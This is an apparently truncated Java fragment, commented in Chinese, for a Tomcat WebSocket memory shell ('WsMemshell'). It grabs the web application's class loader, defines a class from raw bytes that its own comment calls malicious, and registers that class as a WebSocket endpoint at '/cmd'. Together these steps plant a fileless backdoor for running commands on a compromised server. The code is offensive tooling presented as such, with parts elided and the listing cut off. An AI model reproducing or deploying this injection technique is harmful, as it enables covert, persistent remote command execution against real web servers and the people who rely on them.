...
public class WsMemshell {
    static {
        try {
            String urlPath = "/cmd";  //设置websocket地址
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader(); //tomcat的classloader
            StandardRoot standardroot = (StandardRoot) webappClassLoaderBase.getResources();  //webapp的资源
            ...
            clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);  //WebappClassLoaderBase.defineClass(bytes,0,bytes.length)
            ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(clazz, urlPath).build();  //将恶意类和ws路径进行绑定
            WsServerContainer container = (WsServerContainer) standardContext.getServletContext().getAttribute(ServerContainer.class.getName());  //获取WsServerContainer实例
